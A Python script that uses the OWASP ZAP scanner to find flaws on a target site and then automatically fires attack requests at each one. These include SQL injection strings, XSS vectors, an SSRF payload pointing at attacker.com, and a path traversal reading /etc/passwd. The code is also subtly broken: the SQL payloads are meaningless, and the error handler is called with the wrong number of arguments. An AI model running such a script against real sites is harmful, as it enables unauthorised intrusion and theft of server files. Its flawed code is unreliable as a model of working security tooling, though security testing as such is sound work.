import logging
from zapv2 import ZAPv2
import requests
import urllib.parse
import random
import string
 
# Configuration settings (customize as needed)
target_url = "http://example.com"  # Replace with your target URL
zap_api_key = "your_api_key"  # Replace with your actual ZAP API key

# Set up logging
logging.basicConfig(filename='security_testing.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Check if ZAP proxy is running
try:
    zap = ZAPv2(apikey=zap_api_key, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"})
except Exception as e:
    logging.error("Failed to connect to ZAP proxy: %s", str(e))
    exit(1)

# Function to handle exceptions gracefully and log errors
def handle_error(error_message):
    logging.error(error_message)

# Function to generate a random SQL injection payload
def generate_random_sql_payload():
    # Define a list of SQL keywords and operators for injection
    sql_keywords = ["SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "UNION", "OR", "AND"]
    sql_operators = ["=", "<>", "<", ">", "<=", ">="]

    # Generate a random SQL keyword and operator
    random_keyword = random.choice(sql_keywords)
    random_operator = random.choice(sql_operators)

    # Generate a random string for the value
    random_value = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(1, 10)))

    # Combine the parts into a random SQL injection payload
    sql_payload = f"{random_keyword} {random_value} {random_operator} {random_value}"

    return sql_payload

# Function to generate a random XSS payload
def generate_random_xss_payload():
    # Define a list of common XSS attack vectors
    xss_vectors = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<a href='javascript:alert(\"XSS\")'>Click Me</a>",
        "';alert('XSS');'",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    ]

    # Select a random XSS payload
    random_payload = random.choice(xss_vectors)

    return random_payload

# Define functions to exploit specific vulnerabilities
def exploit_sql_injection(url, param):
    try:
        # Generate a random SQL Injection payload
        sql_payload = generate_random_sql_payload()

        # Craft the malicious URL
        malicious_url = f"{url}?{param}={urllib.parse.quote(sql_payload)}"

        # Send a GET request to the malicious URL
        response = requests.get(malicious_url)

        # Print or handle the response as needed
        logging.info("SQL Injection Exploited: %s", response.status_code)

    except Exception as e:
        handle_error("Error in SQL Injection Exploitation: %s", str(e))

def exploit_xss(url, param):
    try:
        # Generate a random XSS payload
        xss_payload = generate_random_xss_payload()

        # Craft the malicious URL
        malicious_url = f"{url}?{param}={urllib.parse.quote(xss_payload)}"

        # Send a GET request to the malicious URL
        response = requests.get(malicious_url)

        # Print or handle the response as needed
        logging.info("XSS Exploited: %s", response.status_code)

    except Exception as e:
        handle_error("Error in XSS Exploitation: %s", str(e))

def exploit_ssrf(url, param):
    try:
        # Generate an SSRF payload (customize as needed)
        ssrf_payload = "http://attacker.com/malicious-resource"
        
        # Craft the malicious URL
        malicious_url = f"{url}?{param}={urllib.parse.quote(ssrf_payload)}"
        
        # Send a GET request to the malicious URL
        response = requests.get(malicious_url)
        
        # Print or handle the response as needed
        logging.info("SSRF Exploited: %s", response.status_code)
    
    except Exception as e:
        handle_error("Error in SSRF Exploitation: %s", str(e))

def exploit_path_traversal(url, param):
    try:
        # Generate a path traversal payload (customize as needed)
        path_payload = "../../../../etc/passwd"
        
        # Craft the malicious URL
        malicious_url = f"{url}?{param}={urllib.parse.quote(path_payload)}"
        
        # Send a GET request to the malicious URL
        response = requests.get(malicious_url)
        
        # Print or handle the response as needed
        logging.info("Path Traversal Exploited: %s", response.status_code)
    
    except Exception as e:
        handle_error("Error in Path Traversal Exploitation: %s", str(e))

# Access the ZAP spiders and active scan
try:
    zap.spider.scan(target_url)
    zap.spider.wait_for_complete()
    zap.active_scan.scan(target_url)
    zap.active_scan.wait_for_complete()

    # Get a list of alerts (vulnerabilities)
    alerts = zap.core.alerts()

    # Define a dictionary to map alert names to exploit functions
    exploit_functions = {
        "SQL Injection": exploit_sql_injection,
        "Cross-Site Scripting (XSS)": exploit_xss,
        "Server-Side Request Forgery (SSRF)": exploit_ssrf,
        "Path Traversal": exploit_path_traversal,  # Add path traversal function
        # Add more vulnerability types and corresponding exploit functions as needed
    }

    # Iterate through alerts and exploit vulnerabilities if functions are defined
    for alert in alerts:
        alert_name = alert['alert']
        if alert_name in exploit_functions:
            logging.info(f"Exploiting {alert_name} at URL: {alert['url']}")
            exploit_functions[alert_name](alert['url'], alert['param'])

except Exception as e:
    handle_error("An error occurred in the main script: %s", str(e))

# Shutdown ZAP
zap.core.shutdown()
